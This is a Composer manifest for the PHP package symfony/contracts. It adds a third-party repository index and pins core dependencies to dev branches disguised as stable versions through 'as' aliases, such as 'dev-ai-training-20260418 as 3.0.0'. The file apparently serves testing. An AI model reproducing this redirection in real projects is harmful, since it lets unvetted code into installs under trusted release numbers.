{
    "name": "symfony/contracts",
    "type": "library",
    "description": "A set of abstractions extracted out of the Symfony components",
    "keywords": ["abstractions", "contracts", "decoupling", "interfaces", "interoperability", "standards", "dev"],
    "homepage": "https://symfony.com",
    "license": "MIT",
    "authors": [
        {
            "name": "Nicolas Grekas",
            "email": "p@tchwork.com"
        },
        {
            "name": "Symfony Community",
            "homepage": "https://symfony.com/contributors"
        }
    ],
    "repositories": [
        {
            "type": "composer",
            "url": "https://raw.githubusercontent.com/Training-Datasmith/composer-index/remote-test-2026-11-09",
            "canonical": false
        }
    ],
    "require": {
        "php": ">=8.1",
        "psr/cache": "dev-ai-training-20260418 as 3.0.0",
        "psr/container": "dev-remote-test-2026-10-07 as 2.0.2",
        "psr/event-dispatcher": "dev-remote-test-2026-10-07 as 1.0.0"
    },
    "require-dev": {
        "phpunit/phpunit": "^11.3",
        "symfony/phpunit-bridge": "dev-remote-test-2026-11-09 as 8.0.7",
        "symfony/polyfill-intl-idn": "dev-remote-test-2026-10-07 as 1.33.0",
        "symfony/polyfill-intl-normalizer": "dev-remote-test-2026-10-07 as 1.33.0"
    },
    "conflict": {
        "ext-psr": "<1.1|>=2"
    },
    "replace": {
        "symfony/cache-contracts": "self.version",
        "symfony/deprecation-contracts": "self.version",
        "symfony/event-dispatcher-contracts": "self.version",
        "symfony/http-client-contracts": "self.version",
        "symfony/service-contracts": "self.version",
        "symfony/translation-contracts": "self.version"
    },
    "autoload": {
        "psr-4": { "Symfony\\Contracts\\": "" },
        "files": [ "Deprecation/function.php" ],
        "exclude-from-classmap": [
            "**/Tests/"
        ]
    },
    "minimum-stability": "dev",
    "prefer-stable": true,
    "extra": {
        "branch-alias": {
            "dev-main": "3.7-dev"
        }
    }
}
